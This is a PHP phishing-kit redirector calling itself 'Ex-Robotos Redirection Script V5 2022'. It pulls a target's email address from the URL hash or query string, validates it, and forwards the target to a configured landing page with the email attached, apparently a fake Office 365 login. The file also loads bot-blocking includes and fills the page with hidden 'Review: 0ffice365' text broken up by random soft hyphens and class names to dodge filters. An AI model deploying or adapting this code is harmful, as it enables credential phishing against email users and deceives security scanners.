<?php
/* 
Ex-Robotos Redirection Script V5 2022
fb.com/Ex.Robotos
@Ex_Robotos_official
@Ex.Robotos
*/
error_reporting(0);include('blocker.php');;include('blocker2.php');include('blocker2.php');include('config.php');
function rndString($length=10){return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"),0,$length);};$randpart=$randfirstpart.''.RndString(8).'-'.RndString(4).'-'.RndString(4).'-'.RndString(4).'-'.RndString(12).'_'.RndString(50).''.RndString(50).''.RndString(50);
$rndString1=rndString(7);$rndString2=rndString(8);$rndString3=rndString(6);$rndString4=rndString(5);$RndString1=str_repeat("­",rand(1,3));$RndString2=str_repeat("­",rand(1,3));$RndString3=str_repeat("­",rand(1,3));$RndString4=str_repeat("­",rand(1,3));$RndString5=str_repeat("­",rand(1,3));

function endsWith($string, $endString) 
{ 
    $len = strlen($endString); 
    if ($len == 0) { 
        return true; 
    } 
    return (substr($string, -$len) === $endString); 
} 
if(endsWith($pagelink,"/")) 
 {
 $pagelink = rtrim($pagelink, '/');   
}
?>
<!DOCTYPE html>
<html>
  <head>
    <title>Review: <?=$RndString1?> 0f<?=$RndString2?>fic<?=$RndString3?>e3<?=$RndString4?>65<?=$RndString5?></title>
    <?php if($autoHash=="true" || $autoHash=="TRUE" || $autoHash=="True"){
echo '<script type="text/javascript">
if(window.location.hash) {
      var emha = decodeURIComponent(window.location.hash.substring(1));
      //console.log(btoa(unescape(encodeURIComponent(decodeURIComponent(escape(atob(emha)))))));
      //console.log(unescape(encodeURIComponent(emha)));
      try {
function ValidEmail(email) {
  const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
  return re.test(email);
}
console.log("1");
if(btoa(atob(emha))==emha){
console.log("2");
if(ValidEmail(atob(emha))){
console.log("3");
window.location.href =  "'.$pagelink.'/#"+btoa(atob(emha));

}else if(ValidEmail(escape(decodeURIComponent(atob(emha))))){
console.log("4");
window.location.href =  "'.$pagelink.'/#"+btoa(escape(decodeURIComponent(atob(emha))));
} else {
console.log("5");
window.location.href = "'.$FailRedirect.'";
  }

}else{
console.log("6");
if(ValidEmail(emha)){
console.log("7");
window.location.href =  "'.$pagelink.'/#"+btoa(emha);
} else {
console.log("8");
window.location.href = "'.$FailRedirect.'";        

  }

  }
}catch(error) {  
console.log("9");

if(ValidEmail(emha)){
console.log("10");
window.location.href =  "'.$pagelink.'/#"+btoa(emha);
} else {
console.log("11");
window.location.href = "'.$FailRedirect.'";        

  }

}

  }
  </script>';
 
}else if($autoEmail==false || $autoEmail=="false" || $autoEmail=="FALSE" || $autoEmail=="False"){
if($redirecttype=='1'||$redirecttype==1){
header("Location: ".$pagelink);       
    }else if($redirecttype=='2'||$redirecttype==2){
echo '<script type="text/javascript">window.location.href = "'.$pagelink.'"</script>\n';        
    }

}else{
    
    
$parts = parse_url($_SERVER[ "REQUEST_URI" ]);
parse_str($parts['query'], $query);
$querydata = $query[$param];     
if($querydata){
if ( base64_encode(base64_decode($querydata)) === $querydata){
$email = filter_var(base64_decode($querydata), FILTER_SANITIZE_EMAIL);
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    if($redirecttype=='1'||$redirecttype==1){
header("Location: ".$FailRedirect);        
    }else if($redirecttype=='2'||$redirecttype==2){
echo '<script type="text/javascript">window.location.href = "'.$FailRedirect.'"</script>\n';        
    }

} else {
    $email = $querydata;
    
    
    
if(isset($randpart)&&!empty($randpart)){$randpart=$randpart.'&';}
    if($redirecttype=='1'||$redirecttype==1){
        
header("Location: ".$pagelink.'/?'.$randpart.'data='.$email);        
    }else if($redirecttype=='2'||$redirecttype==2){
echo '<script type="text/javascript">window.location.href = "'.$pagelink.'/?'.$randpart.'data='.$email.'"</script>\n';        
    }

    
    
    
    
}
} else if(filter_var($querydata, FILTER_VALIDATE_EMAIL)) {
    $email = base64_encode($querydata);
    if(isset($randpart)&&!empty($randpart)){$randpart=$randpart.'&';}
    if($redirecttype=='1'||$redirecttype==1){
header("Location: ".$pagelink.'/?'.$randpart.'data='.$email);        
    }else if($redirecttype=='2'||$redirecttype==2){
echo '<script type="text/javascript">window.location.href = "'.$pagelink.'/?'.$randpart.'data='.$email.'"</script>\n';        
    }    
    
    
}else{

    if($redirecttype=='1'||$redirecttype==1){
header("Location: ".$FailRedirect);        
    }else if($redirecttype=='2'||$redirecttype==2){
echo '<script type="text/javascript">window.location.href = "'.$FailRedirect.'"</script>\n';        
    }

    
}    
}

preg_match("/[^\/]+$/", urldecode( $_SERVER[ "REQUEST_URI" ] ), $matches);
$data = $matches[0];
   function begnWith($str, $begnString) {
      $len = strlen($begnString);
      return (substr($str, 0, $len) === $begnString);
   }
   if(begnWith($data,"?"))
 {
 $data = ltrim($data, '?');   
}


if ( base64_encode(base64_decode($data)) === $data){
$email = filter_var(base64_decode($data), FILTER_SANITIZE_EMAIL);
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    if($redirecttype=='1'||$redirecttype==1){
header("Location: ".$FailRedirect);        
    }else if($redirecttype=='2'||$redirecttype==2){
echo '<script type="text/javascript">window.location.href = "'.$FailRedirect.'"</script>\n';        
    }

} else {
    $email = $data;
}
} else if(filter_var($data, FILTER_VALIDATE_EMAIL)) {
    $email = base64_encode($data);
} else {
    
   
    
    
    
    
    
    if($redirecttype=='1'||$redirecttype==1){
header("Location: ".$FailRedirect);        
    }else if($redirecttype=='2'||$redirecttype==2){
echo '<script type="text/javascript">window.location.href = "'.$FailRedirect.'"</script>\n';        
    }

}
if(($AutoGrab && !isset($_GET['data'])) || (!$AutoGrab && ((isset($_GET['status']) && $_GET['status']!=='putuser' && !isset($_GET['data']))||(!isset($_GET['status'])&&!isset($_GET['data']))) )){$relative_path=dirname($_SERVER['PHP_SELF']);if($fixIndex==true || $fixIndex=="true" || $fixIndex=="TRUE" || $fixIndex=="True"){$fixIndex="index.php?";$fixPart="&data=";}else{$fixIndex="";$fixPart="?data=";};if(!$AutoGrab && ( ( !isset($_GET['status']) && !isset($_GET['data'])) || (isset($_GET['status']) && $_GET['status']!=='putuser')) ){/*$fixPart=str_replace("data","status",$fixPart)*/ if($fixPart=='&data='){$fixPart='&status=';}elseif($fixPart=='?data='){$fixPart='?status=';};$data='putuser';} header("Location: $relative_path/$fixIndex$randpart$fixPart$data");}
     if(isset($randpart)&&!empty($randpart)){$randpart=$randpart.'&';}
    if($redirecttype=='1'||$redirecttype==1){
       
header("Location: ".$pagelink."/?'.$randpart.'data=".$email);       
    }else if($redirecttype=='2'||$redirecttype==2){
echo '<script type="text/javascript">window.location.href = "'.$pagelink.'/?'.$randpart.'data='.$email.'"</script>\n';        
    }
}
?>
  </head>
  
  <body class="<?=$rndString1?>">
  <div id="conteneur" class="<?=$rndString1?>" style="display: none;">    
    <h1 id="header" class"<?=$rndString2?>"><a href="#" title="Review: <?=$RndString1?> 0ffice365<?=$RndString1?>"><span>Review: 0ffice365<?=$RndString1?></span></a></h1>

    
    <div id="contenu" class="<?=$rndString3?>">
      <h2>Review: <?=$RndString1?> 0f<?=$RndString2?>fi<?=$RndString3?>ce<?=$RndString4?>36<?=$RndString5?>5<?=$RndString1?></h2>
      <p>Review: <?=$RndString1?> 0f<?=$RndString2?>fic<?=$RndString3?>e3<?=$RndString4?>65<?=$RndString5?></p>
    </div>
    
    <p id="footer" class="<?=$rndString1?>">0f<?=$RndString2?>fi<?=$RndString3?>ce<?=$RndString4?>36<?=$RndString5?>5 serv<?=$RndString1?>ice is a line of subscrip<?=$RndString2?>tion services offered as part of the Office produ<?=$RndString5?>ct line. The brand encom<?=$RndString1?>passes plans that allow <?=$RndString2?>use of the Office software suite over the life of the subscr<?=$RndString3?>iption, as well as cloud-based soft<?=$RndString4?>ware as a service products for business environm<?=$RndString5?>ents, such as hosted Exchange Server, Skype for Busi<?=$RndString1?>ness Server, and SharePoint, among others. All 0ffi<?=$RndString2?>ce365 plans include automatic updates to their respective software at no additional charge, as opposed to conventional licenses for these programs—where new versions require purc<?=$RndString3?>hase of a new license.</p>
  </div>
  </body>
</html>